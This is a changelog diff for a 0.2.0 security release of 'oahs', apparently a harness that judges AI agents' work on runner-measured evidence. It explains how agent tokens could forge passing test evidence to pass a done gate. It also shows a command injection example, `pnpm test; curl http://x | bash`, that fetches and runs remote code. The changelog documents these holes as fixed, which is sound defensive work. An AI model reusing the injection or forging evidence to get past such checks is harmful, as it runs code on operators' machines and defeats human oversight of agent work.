@@ -6,6 +6,103 @@ whose tree this fork carries; it is not ours to write in.
 Versions are sourced from [`oahs-version.json`](oahs-version.json) and tagged
 `oahs-v*` — never `v*`, which is upstream's tag namespace.
 
+## 0.2.0 — 2026-07-26
+
+A security and survivability release. **0.1.x let any authenticated token forge the
+evidence a done gate is judged on**, and had no backup of any kind. Both are closed.
+
+### Fixed — the thesis, made true in code
+
+The product sells one sentence: *evidence is MEASURED by a runner, not asserted by
+whoever asks; only commands pinned before the agent ran are guards.* Four holes meant
+that sentence was prose, not behaviour. Each is now a conformance pin
+(`packages/core/test/CONFORMANCE.md`, sections 0.2a–0.2d) enforced on both engines.
+
+- **`submit_evidence` required no permission, no claim and no fencing token.** Any actor
+  holding any token — including the six `provision_personas` agents, whose floor-state
+  role is `contributor` (`[]`) — could append `test_run{exitCode:0}` plus
+  `commit{reachableOnRemote:true}` to any work item. Because both evidence guards take
+  the LATEST row of each kind, appending after the real failing measurement turned the
+  done gate green on facts nobody measured. This is the "fake-done" the whole design
+  exists to refuse, and it needed only a token — strictly weaker than the documented
+  honest-operator floor. Now: an `evidence.submit` grant is required, and
+  verdict-bearing evidence on a live-claimed item must present that claim's fencing
+  token. Context evidence (`review_report`) is deliberately exempt from the fencing
+  half, because a reviewer legitimately posts one while the worker holds the claim.
+- **The whole planning surface was ungated.** `create_work_item`, `create_feature`,
+  `import_stories` and `project_create` performed no permission check at any layer. That
+  mattered more than an ordinary missing check because `create_work_item` is the write
+  path for `invokeDevWith`, which the runner interpolates into the agent command it
+  executes — so a zero-grant token could write a string that runs on an operator's
+  machine, in the process holding the push credential and the ssh-agent socket. Now
+  gated on `task.plan` / `feature.init`. An earlier doc claim that `feature.init` was
+  "enforced at the ops layer" was false and is retracted.
+- **The pinned-command "allowlist" was decorative.** The runner checked the first
+  whitespace token, then handed the whole string to `bash -c` — and the list contained
+  `sh` and `bash`. `pnpm test; curl http://x | bash` passed on the strength of `pnpm`,
+  making `gate.spec.approve` equivalent to code execution on every machine that runs a
+  claim. Now: shell metacharacters are refused where the pin is WRITTEN, `sh`/`bash` are
+  out of the allowlist, and the runner executes argv with `shell: false`. Compose two
+  commands as two array entries, which is what `pinnedVerification` already was.
+- **A passing test could certify a different commit than it measured.** The runner
+  normalizes the worktree to HEAD before verifying, which makes the claim true; nothing
+  made it checkable. `test_run` now carries the revision it measured and the done gate
+  refuses a mismatch. Evidence without a revision (pre-0.2.0) is judged exactly as before.
+
+### Added
+
+- **`oahs backup` / `oahs restore`.** There was no backup, export or dump command of any
+  kind; the only guidance anywhere sanctioned copying a live PGlite directory, which
+  yields an unopenable copy. `backup` takes the same cross-process lock `serve` takes, so
+  a torn archive is unreachable rather than discouraged, and archives `pg/` +
+  `tokens.json` + the schema version as ONE artifact (restoring a database beside a
+  mismatched credential store gives you actors with no usable tokens). `restore` refuses a
+  non-empty target and an archive from a newer schema.
+  *During implementation the first version of this locked the wrong path and happily
+  backed up a live directory. The refusal is now the first assertion in its test.*
+- **Observability.** The spine ran `logger: false` with 24 free-text `stderr` writes as
+  its entire diagnostic surface. Now JSON request logs carrying `reqId`, `actorId`,
+  status and duration (the token is never logged, only the actor it resolved to), a
+  `warn` line for a rejected credential — previously recorded nowhere — and a **`/readyz`
+  that touches the engine**. `/healthz` returned a hardcoded `{ok:true}` and never did, so
+  a spine whose PGlite worker had died still reported healthy and the container
+  HEALTHCHECK never noticed; the HEALTHCHECK now probes `/readyz`. `OAHS_LOG=silent`
+  restores silence.
+- **Graceful shutdown.** Nothing anywhere handled `SIGTERM`, so every `docker stop`,
+  `compose restart` and Ctrl-C was an unclean exit. Now drains Fastify, stops the reaper
+  and releases the data-dir lock.
+- **`serve --host`**, defaulting to `127.0.0.1`. The from-source path used to publish an
+  admin-token-guarded spine to the whole LAN with no way to change it. Containers pass
+  `--host 0.0.0.0` explicitly.
+- **`make lint-oahs`**, wired into `make check`: type-aware ESLint over ~49k LOC that had
+  `tsc --noEmit` as its only static gate. It enforces the §0.1 spine-import boundary as a
+  RULE against the compiler's module graph — catching what the CI greps structurally
+  cannot (the `ui-src` tree, a provider outside the six grep literals, a transitive
+  reach). It found 4 dead bindings and **zero floating promises**.
+- **A `SIGKILL` durability test.** The only persistence test restarted through a graceful
+  `close()`; nothing killed a process and reopened the dir. A committed write survives —
+  so the absent `pglite.close()` is not the data-loss risk it looks like, which is now an
+  established fact rather than an assumption.
+
+### Fixed — tests
+
+- **The flaky wall-clock lease tests are fixed, not retried.** One claimed with a 100ms
+  TTL and then asserted the lease was still live; under full-suite load more than 100ms
+  elapsed first, so it failed reliably in the suite and passed in isolation. Rebudgeted
+  with margins, and the runner heartbeat test's TTL raised to 3x its observed
+  synchronous-git tail. A red build that goes green on retry teaches everyone to re-run
+  instead of read.
+- `--port 0` (the ephemeral-port idiom) is accepted; only the validator rejected it,
+  which forced anything driving the real binary to hardcode a port.
+
+### Still NOT in it
+
+Unchanged from 0.1.1: no Postgres server, no migrations, no multi-tenancy
+(`workspace_id` exists on no table), grant scopes stored but not enforced, no metering /
+billing / SSO / audit signing, and **nothing is published** — the binary is
+`apps/oahs/bin/oahs.mjs` after `make build` and must be aliased. A killed server's data
+dir is unopenable for ~20s while its lock goes stale.
+
 ## 0.1.1 — 2026-07-18
 
 A corrective release. **0.1.0 shipped a data-loss bug**; this is the version to run.
